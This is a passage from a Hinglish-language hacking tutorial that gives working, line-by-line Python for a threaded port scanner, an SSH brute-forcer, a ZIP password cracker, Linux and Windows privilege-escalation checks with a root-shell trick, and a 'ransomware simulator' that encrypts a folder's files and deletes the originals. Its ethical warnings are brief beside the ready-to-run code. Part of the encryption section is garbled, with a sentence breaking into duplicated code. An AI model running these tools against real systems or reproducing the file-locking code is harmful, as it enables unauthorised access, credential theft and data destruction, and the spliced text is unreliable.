            # Line 14: Lock acquire karo
            # Kya hota hai? Ek time par sirf ek thread list modify kar sakta hai
            # Kyun? Race condition prevent karne ke liye
            open_ports.append(port)
            # Line 15: Port ko list mein add karo
            print(f"[+] Port {port} OPEN")
            # Line 16: Print karo
        # Line 17: Lock automatically release ho jaata hai
        
        sock.close()
        # Line 18: Socket close karo
    except:
        # Line 19: Agar connection fail (port closed)
        pass
        # Line 20: Kuch mat karo, next port par jao

def worker(target, queue):
    # Line 22: Worker thread function
    # Har thread yeh function run karega
    
    while not queue.empty():
        # Line 23: Jab tak queue mein ports hain
        # Kya hota hai? Loop chalta rahega jab tak kaam hai
        
        port = queue.get()
        # Line 24: Queue se ek port nikalo
        # Kya hota hai? Thread ko ek port milta hai scan karne ke liye
        
        scan_port(target, port)
        # Line 25: Port scan karo
        
        queue.task_done()
        # Line 26: Queue ko batao ki task complete hua
        # Kya hota hai? Queue track karta hai kitne tasks pending hain

def fast_scanner(target, ports, threads=100):
    # Line 28: Main fast scanner function
    # threads=100 = 100 threads parallel mein run honge
    
    queue = Queue()
    # Line 29: Queue object banao
    # Kya hai? Thread-safe queue jisme ports store honge
    
    for port in ports:
        # Line 30: Har port ko queue mein dalo
        queue.put(port)
        # Line 31: Port queue mein add karo
        # Kya hota hai? Saare ports queue mein aa jaate hain
    
    for _ in range(threads):
        # Line 32: 100 threads create karo
        # _ = variable naam ki zaroorat nahi (loop counter)
        
        t = threading.Thread(target=worker, args=(target, queue))
        # Line 33: Thread object banao
        # target=worker = yeh function run hoga
        # args=(target, queue) = function ko yeh arguments milenge
        # Kya hota hai? Ek thread create hota hai
        
        t.daemon = True
        # Line 34: Daemon thread banao
        # Kya hai? Main program exit hone par yeh thread bhi exit ho jaayega
        # Kyun? Hanging threads prevent karne ke liye
        
        t.start()
        # Line 35: Thread start karo
        # Kya hota hai? Thread execute hona shuru ho jaata hai
    
    queue.join()
    # Line 36: Wait karo jab tak saare tasks complete na ho jaayein
    # Kya hota hai? Main thread wait karega
    # Kyun? Saare ports scan hone ke baad hi result dikhana hai
    
    return open_ports
    # Line 37: Open ports list return karo

# Usage
target = "192.168.1.1"
# Line 39: Target IP
ports = range(1, 65536)
# Line 40: All 65535 ports
fast_scanner(target, ports, threads=200)
# Line 41: 200 threads ke saath scan karo
# Kya hota hai? 200 ports parallel mein scan honge - BAHUT FAST!
```

**Breakdown:**
- **Threading:** Multiple ports simultaneously scan hote hain
- **Queue:** Thread-safe data structure (race condition prevent)
- **Lock:** Shared resource (list) ko protect karta hai
- **daemon=True:** Main program exit par threads bhi exit

**Speed Comparison:**
```
Basic Scanner (1000 ports): ~1000 seconds (16 minutes)
Multi-threaded (1000 ports): ~10 seconds
Speed increase: 100x faster!
```

**Expected Output:**
```
[+] Port 22 OPEN
[+] Port 80 OPEN
[+] Port 443 OPEN
[+] Port 3306 OPEN
...
```

**Ethical Tip:** ‚ö†Ô∏è Port scanning bina permission illegal hai. Sirf apne network par karo.

---

# TOOL 2: Password Cracker

**Difficulty:** ‚≠ê‚≠ê (Easy to Moderate)  
**Libraries:** socket, paramiko, ftplib, requests  
**Reality:** Complete control! Python mein sab protocols support hain.

## 2.1 Understanding Password Attacks

### Hinglish Explanation:

**Kya hai yeh?**  
Password Cracker - brute force ya dictionary attack se passwords crack karta hai.

**Kyun zaroori hai?**  
Weak passwords identify karne ke liye.

**Kab use karna?**  
Password policy testing mein.

**Real-world Example:**  
Company ke SSH servers par weak passwords check karte hain.

### Attack Types:

| Type | Description | Speed | Success Rate |
|------|-------------|-------|--------------|
| **Brute Force** | Sab combinations try | Very Slow | 100% (eventually) |
| **Dictionary** | Common passwords | Fast | 60-70% |
| **Hybrid** | Dictionary + variations | Medium | 80-85% |

---

## 2.2 SSH Brute Force

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
import paramiko
# Line 2: paramiko - SSH client library
# Install: pip install paramiko
import sys
# Line 3: sys module - system operations ke liye

def ssh_bruteforce(target, username, password_list):
    # Line 5: Brute force function
    # target = SSH server IP
    # username = target username
    # password_list = passwords ki list
    
    ssh = paramiko.SSHClient()
    # Line 6: SSH client object banao
    # Kya hai? SSH connections manage karta hai
    
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # Line 7: Host key policy set karo
    # Kya karta hai? Unknown hosts ko automatically accept kar leta hai
    # Kyun? Testing mein har baar manually accept nahi karna padega
    # Security Note: Production mein yeh risky hai!
    
    for password in password_list:
        # Line 8: Har password try karo
        # Kya hota hai? List mein se ek-ek password test hoga
        
        try:
            ssh.connect(target, username=username, password=password, timeout=3)
            # Line 9: SSH connection try karo
            # target = server IP
            # username = login username
            # password = current password (list se)
            # timeout=3 = 3 seconds wait karo
            # Kya hota hai? SSH login attempt hota hai
            
            print(f"[+] Password found: {password}")
            # Line 10: Success message
            # Kya hota hai? Correct password mil gaya!
            
            ssh.close()
            # Line 11: Connection close karo
            
            return password
            # Line 12: Password return karo aur function exit karo
            # Kya hota hai? Password mil gaya, aage try karne ki zaroorat nahi
            
        except paramiko.AuthenticationException:
            # Line 13: Agar authentication fail (wrong password)
            print(f"[-] Failed: {password}")
            # Line 14: Failed message
            # [-] = failure indicator
            # Kya hota hai? Wrong password tha, next try karo
            
        except:
            # Line 15: Agar koi aur error (network, timeout, etc.)
            print(f"[!] Connection error")
            # Line 16: Error message
            # [!] = warning/error indicator
            return None
            # Line 17: None return karo (error ki wajah se stop)
    
    return None
    # Line 18: Agar koi password match nahi hua
    # Kya hota hai? Saare passwords try ho gaye, koi kaam nahi aaya

# Usage
target = "192.168.1.100"
# Line 20: Target SSH server
username = "admin"
# Line 21: Target username
passwords = ["admin", "password", "123456", "root"]
# Line 22: Password list (dictionary attack)
result = ssh_bruteforce(target, username, passwords)
# Line 23: Function call

if result:
    print(f"\n[+] SUCCESS! Password is: {result}")
else:
    print("\n[-] Password not found in list")
```

**Breakdown:**
- **paramiko.SSHClient():** SSH connection manager
- **AutoAddPolicy():** Unknown hosts ko accept karta hai
- **AuthenticationException:** Wrong password exception
- **timeout=3:** 3 seconds wait (slow servers ke liye)

**Expected Output:**
```
[-] Failed: admin
[-] Failed: password
[+] Password found: 123456

[+] SUCCESS! Password is: 123456
```

**Real-world Usage:**
```python
# Dictionary file se passwords load karo
with open("rockyou.txt", "r") as f:
    passwords = f.read().splitlines()

ssh_bruteforce("192.168.1.100", "root", passwords)
```

---

## 2.3 ZIP Password Cracker

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
import zipfile
# Line 2: zipfile module - ZIP files handle karne ke liye
# Built-in module hai, install ki zaroorat nahi

def crack_zip(zip_file, password_list):
    # Line 4: ZIP cracker function
    # zip_file = ZIP file ka path (string)
    # password_list = passwords ki list
    
    zip_obj = zipfile.ZipFile(zip_file)
    # Line 5: ZIP file object banao
    # Kya hota hai? ZIP file open ho jaati hai
    # Kyun? Extract karne ke liye access chahiye
    
    for password in password_list:
        # Line 6: Har password try karo
        # Kya hota hai? List se ek-ek password test hoga
        
        try:
            zip_obj.extractall(pwd=password.encode())
            # Line 7: ZIP extract karne ki koshish karo
            # extractall() = saari files extract karo
            # pwd = password parameter
            # password.encode() = string ko bytes mein convert karo
            # Kya hota hai? Agar password correct hai, files extract hongi
            # Agar wrong hai, exception throw hoga
            
            print(f"[+] Password found: {password}")
            # Line 8: Success message
            # Kya hota hai? Correct password mil gaya!
            
            return password
            # Line 9: Password return karo aur exit
            # Kya hota hai? Password mil gaya, aage try karne ki zaroorat nahi
            
        except:
            # Line 10: Agar extraction fail (wrong password)
            print(f"[-] Failed: {password}")
            # Line 11: Failed message
            # Kya hota hai? Wrong password tha, next try karo
    
    return None
    # Line 12: Agar koi password match nahi hua

# Usage
passwords = open("rockyou.txt", "r").readlines()
# Line 14: Password file se passwords load karo
# rockyou.txt = famous password dictionary (14 million passwords)
# readlines() = har line ko list item banata hai
# Kya hota hai? File ke saare passwords list mein aa jaate hain

crack_zip("protected.zip", passwords)
# Line 15: Cracker run karo
```

**Breakdown:**
- **zipfile.ZipFile():** ZIP file object
- **extractall():** Saari files extract karta hai
- **pwd parameter:** Password bytes format mein chahiye
- **encode():** String ko bytes mein convert karta hai

**Expected Output:**
```
[-] Failed: password
[-] Failed: 123456
[-] Failed: qwerty
[+] Password found: secret123
```

**Advanced Version (with progress):**
```python
def crack_zip_advanced(zip_file, password_list):
    zip_obj = zipfile.ZipFile(zip_file)
    total = len(password_list)
    
    for i, password in enumerate(password_list, 1):
        # Line 5: enumerate() - index ke saath loop
        # i = current index (1 se start)
        
        try:
            zip_obj.extractall(pwd=password.strip().encode())
            # strip() - newline characters remove karo
            print(f"\n[+] Password found: {password.strip()}")
            print(f"[*] Tried {i}/{total} passwords")
            return password.strip()
        except:
            print(f"\r[*] Trying: {password.strip()} ({i}/{total})", end="")
            # \r = carriage return (same line par overwrite)
            # end="" = newline mat do
    
    print("\n[-] Password not found")
    return None
```

**Ethical Tip:** ‚ö†Ô∏è Password cracking sirf apni files par karo. Dusre ki files crack karna illegal hai.

---

# TOOL 3: Privilege Escalation Scripts

**Difficulty:** ‚≠ê‚≠ê‚≠ê (Moderate)  
**Libraries:** os, subprocess, winreg, ctypes  
**Reality:** Totally possible! Python OS-level access de sakta hai.

## 3.1 Understanding Privilege Escalation

### Hinglish Explanation:

**Kya hai yeh?**  
Privilege Escalation - low-privilege user se high-privilege (root/admin) access lena.

**Kyun zaroori hai?**  
Initial access limited hota hai. Full control ke liye escalation zaroori hai.

**Kab use karna?**  
Post-exploitation phase mein.

**Real-world Example:**  
Pentester web server compromise karta hai (www-data user). Privilege escalation se root access le leta hai.

---

## 3.2 Linux SUID Enumeration

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
import subprocess
# Line 2: subprocess - system commands run karne ke liye

def find_suid_binaries():
    # Line 4: SUID binaries dhundhne ka function
    # SUID = Set User ID (file owner ke permissions se run hota hai)
    # Kya hai? Agar SUID binary vulnerable hai, privilege escalation ho sakta hai
    
    print("[*] Finding SUID binaries...")
    # Line 5: User ko inform karo
    
    cmd = "find / -perm -4000 -type f 2>/dev/null"
    # Line 6: Linux find command
    # find / = root directory se search karo
    # -perm -4000 = SUID bit set hai (4000 = SUID permission)
    # -type f = sirf files (directories nahi)
    # 2>/dev/null = errors ko suppress karo (permission denied messages)
    # Kya karta hai? Puri system mein SUID files dhundhta hai
    
    result = subprocess.check_output(cmd, shell=True).decode()
    # Line 7: Command run karo aur output lo
    # check_output() = command ka output return karta hai
    # shell=True = shell mein execute karo
    # decode() = bytes ko string mein convert karo
    # Kya hota hai? Command execute hota hai, output string mein milta hai
    
    suid_files = result.strip().split('\n')
    # Line 8: Output ko list mein convert karo
    # strip() = extra whitespace remove karo
    # split('\n') = har line ko alag list item banao
    # Kya hota hai? Har file path ek list item ban jaata hai
    
    print(f"[+] Found {len(suid_files)} SUID binaries:\n")
    # Line 9: Total count print karo
    # len(suid_files) = kitni files mili
    
    for file in suid_files:
        # Line 10: Har file ko print karo
        print(f"  {file}")
        # Line 11: File path print karo (indented)
    
    return suid_files
    # Line 12: List return karo

# Usage
suid_list = find_suid_binaries()
# Line 14: Function call

# Vulnerable SUID binaries check karo
vulnerable = ["/usr/bin/nmap", "/usr/bin/vim", "/usr/bin/find"]
for binary in suid_list:
    if any(vuln in binary for vuln in vulnerable):
        print(f"\n[!] VULNERABLE: {binary}")
        print(f"[*] Check GTFOBins for exploitation: https://gtfobins.github.io/")
```

**Breakdown:**
- **find command:** Linux file search utility
- **-perm -4000:** SUID permission bit
- **2>/dev/null:** Error suppression
- **GTFOBins:** Database of SUID exploitation techniques

**Expected Output:**
```
[*] Finding SUID binaries...
[+] Found 47 SUID binaries:

  /usr/bin/sudo
  /usr/bin/passwd
  /usr/bin/nmap
  /usr/bin/find
  ...

[!] VULNERABLE: /usr/bin/nmap
[*] Check GTFOBins for exploitation: https://gtfobins.github.io/
```

**Why SUID is Dangerous:**
```bash
# Example: nmap with SUID
# Normal user can run as root!
nmap --interactive
nmap> !sh
# Now you have root shell!
```

---

## 3.3 Windows Unquoted Service Paths

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
import subprocess
# Line 2: subprocess module

def find_unquoted_services():
    # Line 4: Unquoted service paths dhundhne ka function
    # Kya hai? Windows services jinka path quotes mein nahi hai
    # Kyun vulnerable? Spaces wale paths mein DLL hijacking ho sakta hai
    
    print("[*] Checking for unquoted service paths...")
    # Line 5: User ko inform karo
    
    cmd = 'wmic service get name,pathname | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """'
    # Line 6: Windows command
    # wmic service get name,pathname = saari services ki details
    # | = pipe (output ko next command mein bhejo)
    # findstr /i /v "C:\\Windows\\\\" = Windows folder ko exclude karo
    #   /i = case insensitive
    #   /v = invert match (jo match nahi kare woh dikhao)
    # findstr /i /v """ = quoted paths ko exclude karo
    # Kya karta hai? Non-Windows, unquoted service paths dhundhta hai
    
    result = subprocess.check_output(cmd, shell=True).decode()
    # Line 7: Command run karo
    # Kya hota hai? Vulnerable services ki list milti hai
    
    print("[+] Vulnerable services:")
    # Line 8: Header print karo
    print(result)
    # Line 9: Results print karo

# Usage
find_unquoted_services()
# Line 11: Function call
```

**Breakdown:**
- **wmic:** Windows Management Instrumentation Command
- **findstr:** Windows grep equivalent
- **/i:** Case insensitive search
- **/v:** Invert match (exclude)

**Expected Output:**
```
[*] Checking for unquoted service paths...
[+] Vulnerable services:
MyService    C:\Program Files\My App\service.exe
TestService  C:\Program Files\Test Service\test.exe
```

**Why Unquoted Paths are Vulnerable:**
```
Service Path: C:\Program Files\My App\service.exe

Windows tries to execute in this order:
1. C:\Program.exe
2. C:\Program Files\My.exe
3. C:\Program Files\My App\service.exe

Attacker can place malicious Program.exe in C:\
Service restart par attacker ka code SYSTEM privileges se run hoga!
```

**Exploitation Example:**
```python
def exploit_unquoted_path(service_name, malicious_exe):
    # Step 1: Service path nikalo
    cmd = f'sc qc "{service_name}"'
    result = subprocess.check_output(cmd, shell=True).decode()
    
    # Step 2: Unquoted path parse karo
    # Example: C:\Program Files\My App\service.exe
    # Exploit: C:\Program.exe place karo
    
    print(f"[*] Place {malicious_exe} at C:\\Program.exe")
    print(f"[*] Restart service: sc stop {service_name} && sc start {service_name}")
    print(f"[+] Malicious code will run as SYSTEM!")
```

**Ethical Tip:** ‚ö†Ô∏è Privilege escalation sirf authorized testing mein. Production systems par mat karo.

---

# TOOL 4: Encryption/Decryption Tools

**Difficulty:** ‚≠ê‚≠ê (Easy to Moderate)  
**Libraries:** cryptography, pycryptodome, Crypto  
**Reality:** Bahut easy! Professional-grade encryption implement kar sakte ho.

## 4.1 Understanding Encryption

### Hinglish Explanation:

**Kya hai yeh?**  
Encryption - data ko unreadable format mein convert karna. Sirf key wala decrypt kar sakta hai.

**Kyun zaroori hai?**  
Data protection, secure communication ke liye.

**Kab use karna?**  
Sensitive data store/transfer karte waqt.

**Real-world Example:**  
Company confidential documents encrypt karke cloud par store karti hai.

### Algorithms:

| Algorithm | Key Size | Speed | Security |
|-----------|----------|-------|----------|
| **AES** | 128/192/256-bit | Fast | Very High |
| **RSA** | 2048/4096-bit | Slow | Very High |
| **DES** | 56-bit | Fast | Low (deprecated) |
| **ChaCha20** | 256-bit | Very Fast | Very High |

---

## 4.2 File Encryptor (AES)

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES
# Line 2: AES cipher import karo
# Install: pip install pycryptodome
from Crypto.Random import get_random_bytes
# Line 3: Random bytes generator
from Crypto.Protocol.KDF import PBKDF2
# Line 4: Key Derivation Function
# PBKDF2 = Password-Based Key Derivation Function 2
import os
# Line 5: OS operations ke liye

class FileEncryptor:
    # Line 7: File encryption class
    
    def __init__(self, password):
        # Line 9: Constructor
        # password = user ka password (string)
        
        self.password = password.encode()
        # Line 10: Password ko bytes mein convert karo
        # encode() = string to bytes
        # Kya hota hai? Crypto functions bytes chahte hain
    
    def encrypt_file(self, input_file, output_file):
        # Line 12: File encryption method
        # input_file = original file path
        # output_file = encrypted file path
        
        salt = get_random_bytes(32)
        # Line 13: Random salt generate karo (32 bytes)
        # Kya hai? Random data jo key derivation mein use hota hai
        # Kyun? Same password se different keys banane ke liye
        # Security: Rainbow table attacks prevent karta hai
        
        key = PBKDF2(self.password, salt, dkLen=32)
        # Line 14: Password se encryption key derive karo
        # PBKDF2() = secure key derivation function
        # dkLen=32 = 32 bytes key (AES-256)
        # Kya hota hai? Password + salt se strong key banta hai
        # Kyun? Direct password use karna insecure hai
        
        cipher = AES.new(key, AES.MODE_EAX)
        # Line 15: AES cipher object banao
        # MODE_EAX = Authenticated encryption mode
        # Kya hai? Encryption + authentication dono
        # Kyun? Tampering detect karne ke liye
        
        with open(input_file, 'rb') as f:
            # Line 16: Input file open karo (read binary mode)
            # 'rb' = read binary
            plaintext = f.read()
            # Line 17: Puri file read karo
            # Kya hota hai? File ka data memory mein aa jaata hai
        
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
        # Line 18: Data encrypt karo
        # encrypt_and_digest() = encrypt + authentication tag generate
        # ciphertext = encrypted data
        # tag = authentication tag (tampering detect karne ke liye)
        # Kya hota hai? Plaintext encrypted ho jaata hai
        
        with open(output_file, 'wb') as f:
            # Line 19: Output file open karo (write binary mode)
            # 'wb' = write binary
            f.write(salt)
            # Line 20: Salt write karo (decryption ke liye chahiye)
            f.write(cipher.nonce)
            # Line 21: Nonce write karo (AES EAX mode ke liye)
            f.write(tag)
            # Line 22: Authentication tag write karo
            f.write(ciphertext)
            # Line 23: Encrypted data write karo
        # Kya hota hai? Encrypted file ban jaati hai
        
        print(f"[+] File encrypted: {output_file}")
        # Line 24: Success message
    
    def decrypt_file(self, input_file, output_file):
        # Line 26: File decryption method
        
        with open(input_file, 'rb') as f:
            # Line 27: Encrypted file open karo
            salt = f.read(32)
            # Line 28: Salt read karo (first 32 bytes)
            nonce = f.read(16)
            # Line 29: Nonce read karo (next 16 bytes)
            tag = f.read(16)
            # Line 30: Tag read karo (next 16 bytes)
            ciphertext = f.read()
            # Line 31: Baki sab encrypted data hai
        # Kya hota hai? File ke components alag ho gaye
        
        key = PBKDF2(self.password, salt, dkLen=32)
        # Line 32: Same key derive karo (password + salt)
        # Kya hota hai? Encryption wali key wapas ban jaati hai
        
        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
        # Line 33: Cipher object banao (same nonce ke saath)
        
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        # Line 34: Decrypt karo aur verify karo
        # decrypt_and_verify() = decrypt + authentication check
        # Kya hota hai? Agar tag match nahi hua, exception throw hoga
        # Kyun? Tampering detect karne ke liye
        
        with open(output_file, 'wb') as f:
            # Line 35: Output file open karo
            f.write(plaintext)
            # Line 36: Decrypted data write karo
        # Kya hota hai? Original file wapas aa gayi
        
        print(f"[+] File decrypted: {output_file}")
        # Line 37: Success message

# Usage
encryptor = FileEncryptor("my_strong_password")
# Line 39: Encryptor object banao
encryptor.encrypt_file("document.pdf", "document.pdf.enc")
# Line 40: File encrypt karo
encryptor.decrypt_file("document.pdf.enc", "document_decrypted.pdf")
# Line 41: File decrypt karo
```

**Breakdown:**
- **PBKDF2:** Password se secure key derive karta hai
- **Salt:** Rainbow table attacks prevent karta hai
- **AES-256:** Industry-standard encryption (32-byte key)
- **MODE_EAX:** Authenticated encryption (tampering detect)
- **Nonce:** Number used once (replay attacks prevent)

**File Structure:**
```
Encrypted File Format:
[Salt: 32 bytes][Nonce: 16 bytes][Tag: 16 bytes][Ciphertext: variable]

Total overhead: 64 bytes
```

**Expected Output:**
```
[+] File encrypted: document.pdf.enc
[+] File decrypted: document_decrypted.pdf
```

**Security Features:**
1. **Strong encryption:** AES-256 (military-grade)
2. **Key derivation:** PBKDF2 (brute force resistant)
3. **Authentication:** Tag tampering detect karta hai
4. **Unique keys:** Salt har encryption mein different key banata haiile, 'wb') as f:
            f.write(salt)
            f.write(cipher.nonce)
            f.write(tag)
            f.write(ciphertext)
        
        print(f"[+] File encrypted: {output_file}")
    
    def decrypt_file(self, input_file, output_file):
        with open(input_file, 'rb') as f:
            salt = f.read(32)
            nonce = f.read(16)
            tag = f.read(16)
            ciphertext = f.read()
        
        key = PBKDF2(self.password, salt, dkLen=32)
        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
        
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        
        with open(output_file, 'wb') as f:
            f.write(plaintext)
        
        print(f"[+] File decrypted: {output_file}")

# Usage
encryptor = FileEncryptor("my_strong_password")
encryptor.encrypt_file("document.pdf", "document.pdf.enc")
encryptor.decrypt_file("document.pdf.enc", "document_decrypted.pdf")
```

---

## 4.3 Ransomware Simulator (ETHICAL ONLY!)

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os

class RansomwareSimulator:
    def __init__(self):
        self.key = get_random_bytes(32)
        self.encrypted_files = []
    
    def encrypt_directory(self, directory):
        print("[!] RANSOMWARE SIMULATION - ETHICAL TESTING ONLY")
        
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith('.txt'):
                    filepath = os.path.join(root, file)
                    self.encrypt_file(filepath)
        
        print(f"[+] Encrypted {len(self.encrypted_files)} files")
        print(f"[+] Key: {self.key.hex()}")
    
    def encrypt_file(self, filepath):
        cipher = AES.new(self.key, AES.MODE_EAX)
        
        with open(filepath, 'rb') as f:
            plaintext = f.read()
        
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
        
        with open(filepath + '.locked', 'wb') as f:
            f.write(cipher.nonce + tag + ciphertext)
        
        os.remove(filepath)
        self.encrypted_files.append(filepath)
    
    def decrypt_directory(self, directory, key_hex):
        key = bytes.fromhex(key_hex)
        
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith('.locked'):
                    filepath = os.path.join(root, file)
                    self.decrypt_file(filepath, key)
        
        print("[+] Decryption complete")
    
    def decrypt_file(self, filepath, key):
        with open(filepath, 'rb') as f:
            nonce = f.read(16)
            tag = f.read(16)
            ciphertext = f.read()
        
        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        
        original_file = filepath.replace('.locked', '')
        with open(original_file, 'wb') as f:
            f.write(plaintext)
        
        os.remove(filepath)

# Usage (ONLY IN TEST ENVIRONMENT!)
sim = RansomwareSimulator()
sim.encrypt_directory("./test_folder")
# Save the key!
sim.decrypt_directory("./test_folder", "key_here")
```

**Ethical Tip:** ‚ö†Ô∏è Ransomware simulation SIRF TEST ENVIRONMENT mein. Real systems par NEVER run karo.

---

# Summary & Best Practices

## Tools Overview:

| Tool | Difficulty | Use Case | Risk Level |
|------|-----------|----------|------------|
| Port Scanner | ‚≠ê‚≠ê | Reconnaissance | Medium |
| Password Cracker | ‚≠ê‚≠ê | Weak password testing | High |
| Privilege Escalation | ‚≠ê‚≠ê‚≠ê | Post-exploitation | Very High |
| Encryption Tools | ‚≠ê‚≠ê | Data protection | Low |

## Best Practices:

1. **Always get written authorization**
2. **Test in isolated environments**
3. **Document everything**
4. **Follow responsible disclosure**
5. **Keep learning and updating**

## Legal Reminder:

‚ö†Ô∏è **YAAD RAKHO:**
- Bina permission = ILLEGAL
- IT Act 2000 violations = Jail + Fine
- Career destruction
- Civil lawsuits

**Practice on:**
- HackTheBox
- TryHackMe
- Bug Bounty Programs
- Own lab setups

---

**[END OF ADDITIONAL TOOLS GUIDE]**

**Stay ethical, stay legal! üîê**
